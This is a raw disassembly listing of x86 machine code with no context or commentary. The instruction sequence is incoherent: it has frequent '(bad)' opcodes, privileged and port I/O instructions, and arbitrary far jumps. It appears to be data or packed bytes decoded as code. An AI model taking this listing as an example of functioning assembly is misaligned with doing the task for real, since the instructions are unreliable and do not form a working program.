  40d55f:	xor    edx,DWORD PTR [edx+0x1ec7f0]
  40d565:	ds jle 0x40d536
  40d568:	inc    ebx
  40d569:	inc    edx
  40d56a:	call   DWORD PTR [edx-0x6d4a680e]
  40d570:	add    eax,0xa6d1159b
  40d575:	sub    eax,0x42478cef
  40d57a:	shr    DWORD PTR [ecx+0x6c740d6c],1
  40d580:	and    BYTE PTR [ebx],al
  40d582:	lds    esp,FWORD PTR [edi+0x5d]
  40d585:	adc    eax,DWORD PTR [edx]
  40d587:	(bad)  
  40d588:	jge    0x40d566
  40d58a:	into   
  40d58b:	and    dh,BYTE PTR [ebp-0x36]
  40d58e:	ins    BYTE PTR es:[edi],dx
  40d58f:	push   es
  40d590:	je     0x40d5f1
  40d592:	imul   esp,DWORD PTR [ebx],0xffffff9a
  40d595:	inc    edx
  40d596:	jl     0x40d578
  40d598:	pop    eax
  40d599:	int    0xc2
  40d59b:	pop    ds
  40d59c:	pop    esp
  40d59d:	adc    bh,BYTE PTR [edx+ebx*8-0x40]
  40d5a1:	jbe    0x40d619
  40d5a3:	mov    eax,0x367f038c
  40d5a8:	mov    al,0x87
  40d5aa:	sub    ebx,DWORD PTR [esi+0x20]
  40d5ad:	out    0xff,al
  40d5af:	in     al,dx
  40d5b0:	test   al,0x65
  40d5b2:	std    
  40d5b3:	cmp    DWORD PTR [ebx],ecx
  40d5b5:	cmp    DWORD PTR [ebp+edx*8-0x54c2a77b],ebx
  40d5bc:	sbb    DWORD PTR [ebx],esp
  40d5be:	jp     0x40d617
  40d5c0:	adc    eax,0x1115ab9c
  40d5c5:	sahf   
  40d5c6:	mov    eax,cs
  40d5c8:	push   ecx
  40d5c9:	addr16 push ds
  40d5cb:	cmp    dl,BYTE PTR [edi-0x29]
  40d5ce:	add    eax,0xb57c51fe
  40d5d3:	pop    ecx
  40d5d4:	sti    
  40d5d5:	aam    0x3d
  40d5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5d8:	dec    ebp
  40d5d9:	mov    al,0x99
  40d5db:	mov    dh,BYTE PTR [ebx+0x77]
  40d5de:	popa   
  40d5df:	sub    BYTE PTR [edx],0xe0
  40d5e2:	adc    DWORD PTR [eax+0x8],esp
  40d5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e6:	and    DWORD PTR [edx+esi*8-0x18c5d0da],ebx
  40d5ed:	shl    BYTE PTR [edx-0x12a49514],cl
  40d5f3:	xchg   esi,eax
  40d5f4:	mov    ch,BYTE PTR [edi+0x6a]
  40d5f7:	mov    bh,0x48
  40d5f9:	push   si
  40d5fb:	and    al,0x6a
  40d5fd:	dec    ebp
  40d5fe:	int3   
  40d5ff:	or     eax,0x4c9492e
  40d604:	xlat   BYTE PTR ds:[ebx]
  40d605:	out    0x7a,al
  40d607:	lock xchg ebp,eax
  40d609:	dec    esp
  40d60a:	iret   
  40d60b:	les    ebx,FWORD PTR [esi]
  40d60d:	jmp    0x40d66d
  40d60f:	xchg   edi,eax
  40d610:	mov    ebx,0xb3a05ab6
  40d615:	mov    cl,0x4e
  40d617:	lahf   
  40d618:	fwait
  40d619:	popf   
  40d61a:	sbb    eax,0x38e60c57
  40d61f:	mov    al,ds:0x1408f9e7
  40d624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d625:	dec    ebp
  40d626:	mul    DWORD PTR [ecx-0x7177a257]
  40d62c:	cdq    
  40d62d:	ja     0x40d5ef
  40d62f:	in     eax,dx
  40d630:	mov    edi,ebp
  40d632:	inc    esi
  40d633:	or     eax,0x7fd07ea8
  40d638:	jle    0x40d5c4
  40d63a:	mov    ecx,0x70fedf02
  40d63f:	sub    DWORD PTR [ecx-0x44],ecx
  40d642:	push   esp
  40d643:	mov    ebp,0xcdefa37d
  40d648:	or     BYTE PTR [edx-0x14],bh
  40d64b:	xor    DWORD PTR [ecx-0x215229c6],edx
  40d651:	sub    ecx,DWORD PTR [ebp-0x16]
  40d654:	add    eax,0x510a38f1
  40d659:	int3   
  40d65a:	shl    eax,1
  40d65c:	jmp    0x40d607
  40d65e:	jae    0x40d5e8
  40d660:	sub    ecx,esi
  40d662:	repnz and al,0x4b
  40d665:	shl    BYTE PTR [ebx-0x72ee820f],cl
  40d66b:	(bad)  
  40d66c:	push   esp
  40d66d:	ss inc eax
  40d66f:	cs retf 0x333a
  40d673:	xor    al,0x5a
  40d675:	mov    ebp,0x23675cec
  40d67a:	xchg   esp,eax
  40d67b:	sub    BYTE PTR [esi-0x3a],dh
  40d67e:	dec    edi
  40d67f:	(bad)  
  40d680:	jmp    0x40d6cb
  40d682:	or     BYTE PTR [esi-0x27],bl
  40d685:	(bad)  
  40d686:	jmp    0xb34a:0x6d81aad7
  40d68d:	pushf  
  40d68e:	cwde   
  40d68f:	xchg   edx,eax
  40d690:	add    eax,0x5a10122c
  40d695:	dec    ecx
  40d696:	ds jl  0x40d6b1
  40d699:	pop    ebx
  40d69a:	adc    bh,0xc0
  40d69d:	clc    
  40d69e:	sbb    eax,0x8f9858d5
  40d6a3:	push   ecx
  40d6a4:	stc    
  40d6a5:	push   ebx
  40d6a6:	stos   DWORD PTR es:[edi],eax
  40d6a7:	sbb    al,bl
  40d6a9:	fs cmp al,0x2c
  40d6ac:	retf   
  40d6ad:	mov    esp,0x9947996c
  40d6b2:	pop    eax
  40d6b3:	adc    ecx,DWORD PTR [ecx+0xda40c86]
  40d6b9:	sbb    eax,0x1202172e
  40d6be:	das    
  40d6bf:	mov    cl,0x4c
  40d6c1:	(bad)  
  40d6c2:	adc    BYTE PTR [bp+si-0x7b],bh
  40d6c6:	pop    ebp
  40d6c7:	mov    dl,0xee
  40d6c9:	imul   ebp,DWORD PTR ds:0x5b18b4d2,0xdc43b79e
  40d6d3:	stos   DWORD PTR es:[edi],eax
  40d6d4:	leave  
  40d6d5:	push   ss
  40d6d6:	test   BYTE PTR [edi+0x36],al
  40d6d9:	lds    esi,FWORD PTR [ebx]
  40d6db:	xor    ecx,ecx
  40d6dd:	pop    esi
  40d6de:	add    DWORD PTR [eax-0x4b8130dc],edi
  40d6e4:	add    esi,edx
  40d6e6:	jne    0x40d670
  40d6e8:	lea    eax,[esi-0x2d60e7b1]
  40d6ee:	out    0xb3,al
  40d6f0:	in     al,dx
  40d6f1:	adc    eax,0x1e28d77b
  40d6f6:	inc    ecx
  40d6f7:	jmp    0xcf2b:0x5a1a8af1
  40d6fe:	mov    ecx,0x8d9e22a
  40d703:	rol    BYTE PTR [eax-0x4e],cl
  40d706:	and    al,0x18
  40d708:	stos   BYTE PTR es:[edi],al
  40d709:	ds stc 
  40d70b:	pushf  
  40d70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d70d:	mov    ah,0x29
  40d70f:	es sahf 
  40d711:	add    cl,BYTE PTR [edx]
  40d713:	mov    ch,0xe
  40d715:	test   al,0xe3
  40d717:	les    ebx,FWORD PTR es:[eax+eax*1]
  40d71b:	inc    eax
  40d71c:	outs   dx,DWORD PTR ds:[esi]
  40d71d:	sti    
  40d71e:	cmp    al,0xb7
  40d720:	ja     0x40d70d
  40d722:	loop   0x40d70a
  40d724:	xchg   ebx,eax
  40d725:	jg     0x40d6b8
  40d727:	ret    0xdc54
  40d72a:	cmp    eax,0xcd73c2b9
  40d72f:	test   al,dl
  40d731:	adc    al,0xb8
  40d733:	adc    al,0x9b
  40d735:	mov    eax,0xc84db519
  40d73a:	mov    ds:0xf543ae15,eax
  40d73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d740:	push   0xe0b0f7ed
  40d745:	and    edi,edi
  40d747:	mov    dl,0xc9
  40d749:	shr    dh,cl
  40d74b:	lds    ebp,FWORD PTR [ebx-0x38]
  40d74e:	mov    eax,0x8db5d389
  40d753:	fwait
  40d754:	popf   
  40d755:	in     eax,dx
  40d756:	sahf   
  40d757:	enter  0x9234,0x39
  40d75b:	shr    DWORD PTR [edi],1
  40d75d:	sbb    eax,0x7ac0ffa5
  40d762:	cmp    BYTE PTR [edi+edi*8],al
  40d765:	into   
  40d766:	out    dx,al
  40d767:	fimul  DWORD PTR [ebp+0x7b529635]
  40d76d:	mov    bl,0xef
  40d76f:	pop    ebx
  40d770:	mov    eax,0x4948135f
  40d775:	rcl    BYTE PTR ds:[ebx+0x51c65578],cl
  40d77c:	inc    ebp
  40d77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d77e:	mov    edx,0xd6597d36
  40d783:	out    dx,eax
  40d784:	mov    al,ds:0x6365d833
  40d789:	mov    dl,0x43
  40d78b:	popa   
  40d78c:	test   bh,ah
  40d78e:	stc    
  40d78f:	xchg   ecx,eax
  40d790:	mov    bh,0xe2
  40d792:	jle    0x40d74e
  40d794:	call   0x43e6:0xf5711907
  40d79b:	cmp    edx,DWORD PTR [esi]
  40d79d:	(bad)  
  40d79e:	mov    dh,0x79
  40d7a0:	xor    eax,0xb4509763
  40d7a5:	xlat   BYTE PTR ds:[ebx]
  40d7a6:	imul   ebp,DWORD PTR [edi+0x160df06],0xf41e05f8
  40d7b0:	push   es
  40d7b1:	jl     0x40d771
  40d7b3:	fmul   st(6),st
  40d7b5:	addr16 int 0xd7
  40d7b8:	inc    esp
  40d7b9:	adc    al,0x1f
  40d7bb:	xor    al,0x56
  40d7bd:	dec    edi
  40d7be:	(bad)  
  40d7bf:	cli    
  40d7c0:	test   BYTE PTR es:[edx+0x4e],cl
  40d7c4:	sbb    esp,edi
  40d7c6:	dec    eax
  40d7c7:	xor    ch,BYTE PTR [edi-0xc]
  40d7ca:	shl    DWORD PTR [ebx-0x4e],cl
  40d7cd:	cmp    BYTE PTR [eax],dh
  40d7cf:	fbld   TBYTE PTR [ebp+0x22b6008b]
  40d7d5:	shl    DWORD PTR [edi],1
  40d7d7:	push   ebx
  40d7d8:	mov    BYTE PTR [ecx],dl
  40d7da:	dec    ebp
  40d7db:	lock bound edx,QWORD PTR [ecx+0xb]
  40d7df:	mov    bl,0x4a
  40d7e1:	and    dh,BYTE PTR [ecx+eiz*2]
  40d7e4:	cmp    dh,bl
  40d7e6:	sub    eax,0x5dc32175
  40d7eb:	push   ebx
  40d7ec:	mov    esp,0x31468930
  40d7f1:	into   
  40d7f2:	mov    eax,ds:0xd5abd078
  40d7f7:	loope  0x40d7ea
  40d7f9:	or     cl,BYTE PTR [esi+ebx*4+0x34]
  40d7fd:	xchg   BYTE PTR [edi-0x763d68e8],ah
  40d803:	xchg   ebp,eax
  40d804:	pop    ebx
  40d805:	fistp  WORD PTR ss:[edx-0x63]
  40d809:	fdivrp st(2),st
  40d80b:	hlt    
  40d80c:	les    esp,FWORD PTR [edi+0x5d]
  40d80f:	and    ah,BYTE PTR [ecx]
  40d811:	sub    BYTE PTR [esi-0x2c],bl
  40d814:	(bad)  
  40d815:	xor    cl,BYTE PTR [edx+0xe]
  40d818:	sub    eax,0x3ef38584
  40d81d:	mov    ch,0x99
  40d81f:	repnz fwait
  40d821:	inc    ecx
  40d822:	test   al,0xb
  40d824:	jge    0x40d84b
  40d826:	dec    eax
  40d827:	cmc    
  40d828:	adc    BYTE PTR ds:0x22d61092,al
  40d82e:	or     eax,0xe85f7f2f
  40d833:	test   al,0x2f
  40d835:	js     0x40d891
  40d837:	mov    WORD PTR [edx-0x1],cs
  40d83a:	lods   al,BYTE PTR ds:[esi]
  40d83b:	lods   eax,DWORD PTR ds:[esi]
  40d83c:	cmp    ecx,DWORD PTR [ebp+0x49]
  40d83f:	mov    ah,0x85
  40d841:	mov    esp,0x8e2c5ef2
  40d846:	xchg   esi,eax
  40d847:	xchg   esp,eax
  40d848:	mov    dh,0xd2
  40d84a:	sub    al,0x10
  40d84c:	retf   
  40d84d:	sbb    DWORD PTR [bx+si-0x2157],ebp
  40d852:	mov    ds:0x340ef74a,al
  40d857:	neg    DWORD PTR [ebx+0x7d]
  40d85a:	xor    BYTE PTR [edx],cl
  40d85c:	fdiv   st,st(3)
  40d85e:	jns    0x40d7e7
  40d860:	loope  0x40d885
  40d862:	mov    WORD PTR [edx],ss
  40d864:	repnz pop esi
  40d866:	jno    0x40d808
  40d868:	cld    
  40d869:	sub    eax,DWORD PTR [ebp-0x75cdc6aa]
  40d86f:	sbb    BYTE PTR [ebp+0x19],bh
  40d872:	xchg   edi,eax
  40d873:	idiv   DWORD PTR [esi+0x780e9f24]
  40d879:	addr16 xchg ebx,eax
  40d87b:	mov    esi,0x6381455
  40d880:	fs dec esp
  40d882:	or     eax,ecx
  40d884:	push   cs
  40d885:	sub    eax,0x59990dd
  40d88a:	push   ebx
  40d88b:	lea    esi,[eax+0xcf1d680]
  40d891:	xor    al,0xfc
  40d894:	xor    eax,0xfd23a85c
  40d899:	xchg   esi,eax
  40d89a:	pop    esp
  40d89b:	jmp    0xa64:0x70eec95b
  40d8a2:	pusha  
  40d8a3:	das    
  40d8a4:	retf   0x8fb0
  40d8a7:	jmp    0x6b19b99
  40d8ac:	loop   0x40d8c6
  40d8ae:	pop    eax
  40d8af:	mov    esp,0x7a5f7815
  40d8b4:	in     al,dx
  40d8b5:	push   ss
  40d8b6:	cmp    dh,dh
  40d8b8:	popa   
  40d8b9:	sahf   
  40d8ba:	mov    dl,0xa5
  40d8bc:	mov    cl,0x32
  40d8be:	adc    ebx,DWORD PTR [edi]
  40d8c0:	not    BYTE PTR [esp+eiz*8]
  40d8c3:	mov    eax,0xd1024177
  40d8c8:	mov    esp,0xc7e0cf13
  40d8cd:	pop    esi
  40d8ce:	pop    ds
  40d8cf:	int    0x8c
  40d8d1:	nop
  40d8d2:	mov    ecx,0x70a50767
  40d8d7:	mov    ah,0xc
  40d8d9:	sbb    dh,al
  40d8db:	fiadd  WORD PTR [ecx]
  40d8dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8de:	inc    edx
  40d8df:	push   edx
  40d8e0:	jl     0x40d93a
  40d8e2:	addr16 jl 0x40d908
  40d8e5:	dec    edx
  40d8e6:	mov    dl,0xe3
  40d8e8:	inc    ebp
  40d8e9:	imul   edi,esp,0xffffff8d
  40d8ec:	or     DWORD PTR [ecx],ebp
  40d8ee:	out    dx,al
  40d8ef:	xor    cl,al
  40d8f1:	sub    edi,esp
  40d8f3:	sbb    ecx,esi
  40d8f5:	mov    al,BYTE PTR [ebp+0x35b4a920]
  40d8fb:	popa   
  40d8fc:	lods   eax,DWORD PTR ds:[esi]
  40d8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fe:	add    DWORD PTR [eax+0x18b2a31],edi
  40d904:	add    cl,dh
  40d906:	push   ebx
  40d907:	loopne 0x40d955
  40d909:	lods   al,BYTE PTR ds:[esi]
  40d90a:	push   es
  40d90b:	into   
  40d90c:	jno    0x40d973
  40d90e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d90f:	jo     0x40d950
  40d911:	xchg   cl,ah
  40d913:	nop
  40d914:	dec    eax
  40d915:	out    dx,eax
  40d916:	clc    
  40d917:	sbb    eax,0x5f86f5c5
  40d91c:	adc    ch,BYTE PTR [ebx+0x218a0311]
  40d922:	out    0x2a,eax
  40d924:	mov    ecx,DWORD PTR [edx+0x40]
  40d927:	frstor ds:0x970ec00d
  40d92d:	pop    esp
  40d92e:	ds sub edx,ebx
  40d931:	pop    es
  40d932:	pop    ebx
  40d933:	dec    ebx
  40d934:	push   esi
  40d935:	nop
  40d936:	ds jmp 0xb13e:0x58f63c9d
  40d93e:	scas   eax,DWORD PTR es:[edi]
  40d93f:	sbb    eax,0x1573054b
  40d944:	jo     0x40d9bc
  40d946:	ins    DWORD PTR es:[edi],dx
  40d947:	mov    eax,0x901ac225
  40d94c:	stc    
  40d94d:	mov    ah,0xa6
  40d94f:	mov    ah,BYTE PTR ds:0x7683f884
  40d955:	jg     0x40d94d
  40d957:	clc    
  40d958:	sub    edi,DWORD PTR [edx+0x1c]
  40d95b:	push   es
  40d95c:	outs   dx,DWORD PTR ds:[esi]
  40d95d:	mov    WORD PTR [ebp+0x4d],?
  40d960:	mov    bl,0x2e
  40d962:	push   0x990fa693
  40d967:	or     BYTE PTR [edx],bl
  40d969:	xchg   ebp,eax
  40d96a:	out    dx,al
  40d96b:	xor    BYTE PTR [edi],bl
  40d96d:	sbb    esi,DWORD PTR [eax+edi*1-0x23]
  40d971:	fiadd  WORD PTR [ecx-0x48477560]
  40d977:	mov    DWORD PTR [ebx+0x5d13431],ebx
  40d97d:	mov    ah,0x3
  40d97f:	cmp    eax,0x567696d4
  40d984:	or     BYTE PTR [edi+edi*8],bl
  40d987:	retf   
  40d988:	retf   0x9df7
  40d98b:	popa   
  40d98c:	data16 jp 0x40d9f0
  40d98f:	xchg   DWORD PTR [ebx+0x59],ecx
  40d992:	pmulhuw mm2,mm4
  40d995:	xchg   esp,eax
  40d996:	jbe    0x40da11
  40d998:	jne    0x40d9d4
  40d99a:	mov    ds:0x42509b0c,eax
  40d99f:	jle    0x40d958
  40d9a1:	int3   
  40d9a2:	std    
  40d9a3:	jae    0x40d990
  40d9a5:	push   ds
  40d9a6:	pop    edi
  40d9a7:	dec    edx
  40d9a8:	das    
  40d9a9:	hlt    
  40d9aa:	pop    edx
  40d9ab:	push   esi
  40d9ac:	mov    cl,0x35
  40d9ae:	mov    al,0xe5
  40d9b0:	rcr    bl,0x59
  40d9b3:	mulps  xmm1,XMMWORD PTR [edi+edi*1]
  40d9b7:	repz retf 
  40d9b9:	inc    DWORD PTR [esi]
  40d9bb:	fisub  DWORD PTR [esi+0x3]
  40d9be:	ret    
  40d9bf:	mov    eax,ds:0x8a91634b
  40d9c4:	fcomi  st,st(7)
  40d9c6:	icebp  
  40d9c7:	cmp    DWORD PTR [edx+0x4ee2a3],esp
  40d9cd:	or     al,0x1e
  40d9cf:	fstp   QWORD PTR [esp+ebp*4]
  40d9d2:	push   es
  40d9d3:	dec    ebx
  40d9d4:	aas    
  40d9d5:	cmc    
  40d9d6:	in     al,dx
  40d9d7:	and    BYTE PTR [ecx+0x318d1191],0x35
  40d9de:	popa   
  40d9df:	scas   eax,DWORD PTR es:[edi]
  40d9e0:	and    DWORD PTR [eax],0x7a
  40d9e3:	std    
  40d9e4:	jae    0x40d9a8
  40d9e6:	popf   
  40d9e7:	mov    BYTE PTR ds:0x7336a1d,dl
  40d9ed:	ret    0x236c
  40d9f0:	dec    esp
  40d9f1:	jae    0x40d9a0
  40d9f3:	sub    al,0x5e
  40d9f5:	cs ins BYTE PTR es:[edi],dx
  40d9f7:	or     ebp,DWORD PTR [edx-0x31e3a8b8]
  40d9fd:	test   eax,0x3f6b5e2e
  40da02:	mov    edx,0xff16d558
  40da07:	test   BYTE PTR [eax-0x3fe088bd],cl
  40da0d:	dec    esi
  40da0e:	arpl   ax,sp
  40da10:	and    al,0x15
  40da12:	xchg   ebp,eax
  40da13:	xor    eax,DWORD PTR [edx+0x39]
  40da16:	jns    0x40d9f7
  40da18:	and    edi,DWORD PTR [eax+0x38c2fddb]
  40da1e:	adc    al,0xc9
  40da20:	int    0x1b
  40da22:	std    
  40da23:	push   0xb0365c6b
  40da28:	or     ah,BYTE PTR [esi+0x3d265da9]
  40da2e:	fnstcw WORD PTR ds:0x30391ad3
  40da34:	mov    ebx,0xd4e2e3a1
  40da39:	jl     0x40da96
  40da3b:	cmp    DWORD PTR ds:0xc6685023,ebp
  40da41:	push   eax
  40da42:	jmp    0xdefd916
  40da47:	dec    edi
  40da48:	inc    edx
  40da49:	xor    ebp,DWORD PTR [edx+eiz*8+0x6517d43e]
  40da50:	and    eax,0x252c549b
  40da55:	lock sbb DWORD PTR [ecx+0x72],0x8b20735e
  40da5d:	mov    bh,0x3f
  40da5f:	test   DWORD PTR [ebx*4+0xd0aaa93],esp
  40da66:	mov    bl,0x2a
  40da68:	xchg   esi,eax
  40da69:	inc    eax
  40da6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da6b:	sbb    al,0xef
  40da6d:	test   BYTE PTR [edx+eax*4+0x7e],cl
  40da71:	aad    0xab
  40da73:	ins    BYTE PTR es:[edi],dx
  40da74:	bound  ebx,QWORD PTR [edx+eax*4+0x47727f20]
  40da7b:	fnstsw WORD PTR [ebx+0x6022ccea]
  40da81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da82:	fld    TBYTE PTR [eax+0x6c]
  40da85:	loopne 0x40db05
  40da87:	jg     0x40dacf
  40da89:	into   
  40da8a:	(bad)  
  40da8b:	js     0x40db04
  40da8d:	dec    edx
  40da8e:	vpmullw ymm1,ymm5,YMMWORD PTR [edi]
  40da92:	cmp    al,0x25
  40da94:	scas   eax,DWORD PTR es:[edi]
  40da95:	adc    BYTE PTR [esp-0x46],0x78
  40da9a:	sar    esp,cl
  40da9c:	fwait
  40da9d:	int3   
  40da9e:	inc    eax
  40da9f:	out    dx,al
  40daa0:	sub    dh,BYTE PTR [edx]
  40daa2:	xchg   ecx,eax
  40daa3:	sbb    eax,DWORD PTR [ebx+ecx*2]
  40daa6:	loop   0x40da2b
  40daa8:	cli    
  40daa9:	and    eax,0xc006f8c0
  40daae:	div    BYTE PTR [edi+0x57]
  40dab1:	push   edx
  40dab2:	inc    edx
  40dab3:	cmp    al,0x9
  40dab5:	mov    esi,0x83b046ca
  40daba:	add    eax,0xbea18050
  40dabf:	outs   dx,DWORD PTR ds:[esi]
  40dac0:	jmp    0x622e2903
  40dac5:	mov    edi,0x63652513
  40daca:	mov    eax,0xd004beb
  40dacf:	ret    0x80d0
  40dad2:	out    0xa9,eax
  40dad4:	jle    0x40da85
  40dad6:	pop    edx
  40dad7:	mov    ds:0x8f371486,eax
  40dadc:	fisubr DWORD PTR [edx+0x7f]
  40dadf:	shl    ch,cl
  40dae1:	cwde   
  40dae2:	mov    eax,ds:0xb20676b1
  40dae7:	lods   eax,DWORD PTR ds:[esi]
  40dae8:	mov    ecx,0x36befa9e
  40daed:	push   esi
  40daee:	and    al,0x87
  40daf0:	gs pusha 
  40daf2:	pop    es
  40daf3:	in     al,0x67
  40daf5:	retf   0x8cdc
  40daf8:	div    DWORD PTR [edx-0x46bef66c]
  40dafe:	sub    esi,DWORD PTR [ecx+edx*8+0x791c61f]
  40db05:	cmp    edi,DWORD PTR [ebx]
  40db07:	xor    al,0x3d
  40db09:	cmp    esi,esp
  40db0b:	stos   BYTE PTR es:[edi],al
  40db0c:	xor    al,0x97
  40db0e:	test   BYTE PTR [ebx+ecx*2],0x6d
  40db12:	dec    esp
  40db13:	and    DWORD PTR [eax-0x48],ebx
  40db16:	sbb    BYTE PTR [edi-0x12],ch
  40db19:	and    DWORD PTR [ebp+esi*1+0x6fd97331],edx
  40db20:	inc    eax
  40db21:	int3   
  40db22:	std    
  40db23:	pop    ebp
  40db24:	cmp    ebx,ecx
  40db26:	cmp    bh,al
  40db28:	sbb    eax,0xdfcc5b39
  40db2d:	add    al,BYTE PTR [ebx+eiz*8+0x17e0b6fb]
  40db34:	retf   0xc4af
  40db37:	jp     0x40daf1
  40db39:	aad    0xfe
  40db3b:	in     eax,0xf9
  40db3d:	clc    
  40db3e:	stos   BYTE PTR es:[edi],al
  40db3f:	cdq    
  40db40:	adc    al,0xd8
  40db42:	fld    QWORD PTR [eax-0x34f887d9]
  40db48:	mov    ds:0xac035592,eax
  40db4d:	sub    dl,BYTE PTR [ecx+0x5886336a]
  40db53:	loop   0x40daea
  40db55:	add    eax,0x46b008e1
  40db5a:	push   ss
  40db5b:	cmp    bl,bl
  40db5d:	js     0x40db90
  40db5f:	inc    ecx
  40db60:	int3   
  40db61:	push   edi
  40db62:	jp     0x40db9c
  40db64:	sub    eax,0x78a3b029
  40db69:	in     eax,dx
  40db6a:	(bad)  
  40db6d:	mov    ss,WORD PTR [edi]
  40db6f:	pop    esi
  40db70:	aad    0xc0
  40db72:	test   eax,0xe89247cd
  40db77:	sti    
  40db78:	mov    edx,0x3a1cfa08
  40db7d:	je     0x40db43
  40db7f:	cmp    al,0x6b
  40db81:	pop    ss
  40db82:	or     ebp,edi
  40db84:	sbb    eax,0x8a10457a
  40db89:	jns    0x40db10
  40db8b:	pusha  
  40db8c:	cmp    eax,0x4f6b31d
  40db91:	into   
  40db92:	dec    ebp
  40db93:	push   ebp
  40db94:	ss dec ebp
  40db96:	sbb    edx,DWORD PTR [edi+0x1ba75eb1]
  40db9c:	push   edx
  40db9d:	jno    0x40db80
  40db9f:	and    bh,0xb3
  40dba2:	mov    al,ds:0xe3bc24f4
  40dba7:	mov    al,0x4
  40dba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbaa:	mov    esi,0xd044abbf
  40dbaf:	pop    ecx
  40dbb0:	lods   eax,DWORD PTR ds:[esi]
  40dbb1:	test   eax,0x9fdf6034
  40dbb6:	mov    WORD PTR [esi+0x32c92481],cs
  40dbbc:	bound  eax,QWORD PTR [ebx]
  40dbbe:	pop    ebx
  40dbbf:	repz test DWORD PTR [edi],ebp
  40dbc2:	pop    ss
  40dbc3:	fsub   QWORD PTR [edi-0x2f]
  40dbc6:	or     eax,0x9e08449b
  40dbcb:	push   0xe95c3d67
  40dbd0:	pop    edx
  40dbd1:	pop    edi
  40dbd2:	loop   0x40dbeb
  40dbd4:	push   cs
  40dbd5:	push   esi
  40dbd6:	xchg   ebx,eax
  40dbd7:	jecxz  0x40dc44
  40dbd9:	icebp  
  40dbda:	mov    eax,ds:0xa236a2
  40dbdf:	jns    0x40dbdc
  40dbe1:	bound  edx,QWORD PTR [edi]
  40dbe3:	aam    0x4d
  40dbe5:	mov    ebp,0x26e5916a
  40dbea:	pop    es
  40dbeb:	add    DWORD PTR [esi+0x49b46ae9],0xffffffa1
  40dbf2:	xchg   esp,eax
  40dbf3:	pop    ebx
  40dbf4:	leave  
  40dbf5:	popf   
  40dbf6:	mov    bh,0xd0
  40dbf8:	int3   
  40dbf9:	lahf   
  40dbfa:	test   eax,0xcb4da948
  40dbff:	mov    eax,ds:0xb3a971b4
  40dc04:	dec    edx
  40dc05:	outs   dx,BYTE PTR ds:[esi]
  40dc06:	dec    eax
  40dc07:	out    0x3a,eax
  40dc09:	jl     0x40dc56
  40dc0b:	or     esi,DWORD PTR [ebp-0x46]
  40dc0e:	outs   dx,BYTE PTR ds:[esi]
  40dc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc11:	mov    esi,0xb029595a
  40dc16:	pop    edi
  40dc17:	in     eax,dx
  40dc18:	test   al,0xd5
  40dc1a:	cld    
  40dc1b:	hlt    
  40dc1c:	push   esp
  40dc1d:	cld    
  40dc1e:	outs   dx,DWORD PTR ds:[esi]
  40dc1f:	xchg   ebx,eax
  40dc20:	aaa    
  40dc21:	mov    ah,0x1c
  40dc23:	mov    edx,edi
  40dc25:	jne    0x40dc9b
  40dc27:	or     edi,DWORD PTR [ecx+0x555c2126]
  40dc2d:	jecxz  0x40dc02
  40dc2f:	faddp  st(1),st
  40dc31:	(bad)  
  40dc32:	icebp  
  40dc33:	mov    fs,esp
  40dc35:	push   eax
  40dc36:	sti    
  40dc37:	sbb    eax,0x87bf31b9
  40dc3c:	and    BYTE PTR [ecx-0x3b],dl
  40dc3f:	js     0x40dc4a
  40dc41:	pop    ecx
  40dc42:	fist   WORD PTR [ebx]
  40dc44:	cmp    DWORD PTR [ebx-0x7b35b330],ecx
  40dc4a:	gs jecxz 0x40dc32
  40dc4d:	dec    eax
  40dc4e:	pop    ecx
  40dc4f:	xlat   BYTE PTR ds:[ebx]
  40dc50:	jle    0x40dc61
  40dc52:	and    BYTE PTR [ebp+eax*1+0x24a49d2d],ah
  40dc59:	jo     0x40dc14
  40dc5b:	adc    DWORD PTR ds:0x5b912bcb,eax
  40dc61:	jl     0x40dc76
  40dc63:	(bad)  [edi-0x35]
  40dc66:	imul   eax,DWORD PTR [edi],0xf
  40dc69:	inc    edx
  40dc6a:	inc    BYTE PTR [eax+0x17]
  40dc6d:	xor    esi,DWORD PTR [ebp-0x2fc0a689]
  40dc73:	fldenv [ebx+0x107b0f91]
  40dc79:	xor    eax,0x3442107f
  40dc7e:	lahf   
  40dc7f:	out    0x91,eax
  40dc81:	mov    ah,0xb3
  40dc83:	xor    al,0x8e
  40dc85:	aam    0x68
  40dc87:	jge    0x40dcfe
  40dc89:	pop    ecx
  40dc8a:	add    eax,0x2ddbdc86
  40dc8f:	enter  0xf752,0x96
  40dc93:	and    eax,0x8771c79c
  40dc98:	cli    
  40dc99:	je     0x40dcd7
  40dc9b:	test   al,0xe9
  40dc9d:	fisttp WORD PTR [edi+0x1e]
  40dca0:	add    al,0x39
  40dca2:	into   
  40dca3:	adc    cl,bh
  40dca5:	test   eax,esp
  40dca7:	outs   dx,BYTE PTR ds:[esi]
  40dca8:	sub    BYTE PTR [ecx],bh
  40dcaa:	inc    esi
  40dcab:	mov    al,0xf9
  40dcad:	jb     0x40dcd9
  40dcaf:	test   DWORD PTR [ecx],esp
  40dcb1:	(bad)  
  40dcb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcb3:	shr    BYTE PTR [ebp-0x5e],cl
  40dcb6:	push   cs
  40dcb7:	and    al,0xc
  40dcb9:	fwait
  40dcba:	ins    DWORD PTR es:[edi],dx
  40dcbb:	mov    dh,0xdb
  40dcbd:	xchg   ebx,eax
  40dcbe:	fcompp 
  40dcc0:	ja     0x40dc92
  40dcc2:	rcl    DWORD PTR [esi+0x1f],1
  40dcc5:	sbb    DWORD PTR [ebx-0x40],ebp
  40dcc8:	(bad)  
  40dcc9:	mov    esi,0xacfe790b
  40dcce:	dec    ebx
  40dccf:	xor    DWORD PTR [eax],ebp
